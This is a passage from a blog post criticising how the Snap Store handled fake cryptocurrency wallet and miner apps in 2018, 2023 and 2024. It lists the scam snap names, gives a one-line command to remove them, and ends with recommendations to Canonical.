href="https://forum.snapcraft.io/t/phishing-app-on-the-snap-store-is-my-computer-compromised/37045/7">later</a> on the forum:</p><blockquote><p>The cryptocurrency was transferred out of my Wallet against my will to an unknown address.</p></blockquote><p>After the September 2023 incident, Canonical <em>temporarily</em> <a href="https://forum.snapcraft.io/t/temporary-suspension-of-automatic-snap-registration-following-security-incident/37077">suspended</a> unrestricted registration of snap names.</p><p>A month later, that limitation was <a href="https://forum.snapcraft.io/t/temporary-suspension-of-automatic-snap-registration-following-security-incident/37077/8">lifted</a> with the comment:</p><blockquote><p>“Instead, we will be conducting daily reviews of new snaps being uploaded. We will flag, investigate and take down any snap that looks suspicious. We are taking this action to remove friction from the snap publishing experience, whilst still closely monitoring what is being uploaded on a regular basis.”</p></blockquote><p>They <strong>aren’t</strong> monitoring and investigating closely enough though!</p><p><strong>They missed the Exodus snap uploaded on the 6th of February 2024, which then caught someone out to the tune of nearly half a million dollars, six days later!</strong></p><h2 id="not-enough">Not enough</h2><p>Thankfully it’s no longer possible for new users to install the scam Exodus wallet application. However, that doesn’t help the people who still have the application installed on their computers.</p><p>It’s very likely that many people inadvertently installed the application believing it was genuine, but have yet to fall into the trap of entering their security credentials.</p><p><strong>This is a series of ticking time bombs, waiting to go off.</strong></p><p>Or, perhaps the bomb has already gone off, multiple times, taking funds in the process, but people can’t or don’t want to speak up. Maybe they haven’t figured out what happened yet.</p><h2 id="what-now">What now?</h2><p>Following the February 2024 incident, a discussion thread titled “<a href="https://forum.snapcraft.io/t/should-unverified-cryptocurrency-apps-be-banned/38919">Should unverified cryptocurrency apps be banned?</a>” was started on the Snapcraft forum. After a week it’s had only one reply, a hundred or so views, and has already dropped below thirty other threads on the front page.</p><p>I’m not privy to internal conversations inside Canonical. I suspect the recent event - and with any luck (humbly) - this blog post - may trigger further discussion and concrete plans. I certainly hope so.</p><h2 id="in-summary-the-tldr">In summary (the tl;dr)</h2><p>Multiple genuine-looking scam cryptocurrency miners and fake Bitcoin wallet applications have been published in the Snap store since 2018. The latest has cost at least one person nearly half a million dollars in Bitcoin.</p><p><strong>Some of these scam applications are still installed on end-user computers.</strong></p><h3 id="may-2018">May 2018</h3><p>Three open-source games were forked, a cryptocurrency miner was added, and these were re-uploaded to the Snap store under another name</p><ul><li>Once discovered the games were quarantined, the malware removed and a clean version was pushed out to users</li><li>Canonical <a href="https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store">announced</a> their intention to do nothing about this, and invited discussion which publicly appeared to go nowhere</li></ul><h3 id="september-2023">September 2023</h3><p>A glut of scam cryptocurrency applications were published, with a user reporting some monetary loss.</p><ul><li>The applications were quarantined, making them unavailable for further download</li><li>No update was pushed out to clean client systems of the malware</li><li>No announcement was made informing users who had the malware still installed, on how to clean it up</li></ul><h3 id="february-2024">February 2024</h3><p>More scam cryptocurrency applications were published leading to significant financial loss for a user.</p><ul><li>The applications were quarantined, thus making them unavailable for download</li><li>No update was pushed out to clean client systems of the malware</li><li>No announcement has yet been made informing users who have the malware, on how to clean it up</li></ul><p><strong>As far as I am aware, some of the known scam crypto applications that have been published in the Snap store are still installed on client systems.</strong></p><h3 id="what-users-should-do">What users should do</h3><p>Remove all of the following snaps from their systems with <code>snap remove --purge &lt;snapname&gt;</code>. They are all ‘private’ in the Snap store, so their store pages show ‘404’, and the software cannot <em>currently</em> be downloaded.</p><p>These first three are ’technically’ okay because they were cleaned of malware and then updated in the store. So anyone who had the malware payload should have had it removed if they installed updates - which is automatic by default with snap. Earlier revisions still have the malware though.</p><ul><li>2048buntu</li><li>hextris</li><li>freecraft</li></ul><p>These may or may not have contained malware, misfeatures or other scammy things. So it’s best to remove them all.</p><ul><li>bip-web</li><li>bitwallet</li><li>btcwal</li><li>btcwallet</li><li>coinbase</li><li>cryptowal</li><li>electrum-wallet2</li><li>exodus</li><li>exoduswal</li><li>exoduswalet</li><li>exodwallet</li><li>guarda</li><li>komodo</li><li>ledger-live-wallet</li><li>ledger1</li><li>ledgerlive</li><li>liveledger</li><li>metamask</li><li>new-electrum-wallet</li><li>sparrow</li><li>sparrow-wallet</li><li>sparrowwalet</li><li>sparrowwallet</li><li>trezor-wallet</li><li>trezorwallet</li><li>trustwallet</li></ul><p>Here’s a one-liner to get rid of them all:</p><p><code>for s in 2048buntu hextris freecraft bip-web bitwallet btcwal btcwallet coinbase cryptowal electrum-wallet2 exodus exoduswal exoduswalet exodwallet guarda komodo ledger-live-wallet ledger1 ledgerlive liveledger metamask new-electrum-wallet sparrow sparrow-wallet sparrowwalet sparrowwallet trezor-wallet trezorwallet trustwallet; do sudo snap remove --purge $s; done</code></p><h3 id="what-i-think-canonical-should-do-urgently">What I think Canonical should do urgently</h3><p>These suggestions are to reduce the opportunity for a bad actor to publish a similar scam application.</p><ul><li>Mandate &amp; verify that all published applications using financial and/or cryptocurrency branding are officially published directly by the upstream developers</li><li>Change the store so <strong>all</strong> initial Snapcraft store name registrations are gated behind human review</li><li>Gate the first month of a new snap uploads behind human review</li><li>Block <em>all</em> interface connection requests behind a human review, including automatically connected ones like <code>network</code> and <code>home</code></li><li>Fully staff the team doing the above to respond to registration, interface connection and upload requests in a timely fashion</li><li>Send out a clean snap update (as we did in 2018) to all clients that have the scam snaps still installed</li></ul><h3 id="what-i-think-canonical-should-seriously-consider-next">What I think Canonical should seriously consider next</h3><p>Additional steps to enable users to have more confidence in the applications published in Snap store.</p><ul><li>Publishers should have their ’newness’ on the platform highlighted with a ‘New Publisher’ badge</li><li>Snaps that are less than <code>$M</code> (2?) months old should have a ‘New Application’ badge</li><li>Snaps that have fewer than <code>$N</code> (50?) installs should not appear in search results</li><li>The store should make prominent notes to users that newly published snaps and snaps from new publishers should be viewed with extreme caution</li><li>Provide better education to users on the risks of installing finance and cryptocurrency software from the Snap store</li><li>Review and update all wording in graphical and web software store-fronts to ensure users aren’t given a false impression that malware is ‘safe’</li></ul><h3 id="what-canonical-should-not-do">What Canonical should not do</h3><ul><li>Nothing</li><li>Blame the user</li><li><a href="https://blog.ubuntu.com/2018/05/15/trust-and-security-in-the-snap-store">This</a> kind of response</li><li>Celebrate that being a target for bad actors means the platform is now big and successful</li></ul><h2 id="conclusion">Conclusion</h2><p>I have used Ubuntu most days for nearly 20 years. I contribute to, advocate for, and support Ubuntu users. I also publish numerous snaps in the Snap store.</p><p>I want both Ubuntu and Snapcraft be secure, successful and safe projects. I want to be able to recommend them to friends, without having to warn them about dodgy software in the Snap store.</p><p>Canonical can do better here.</p></article></div></div></div></div>
  </body>
</html>
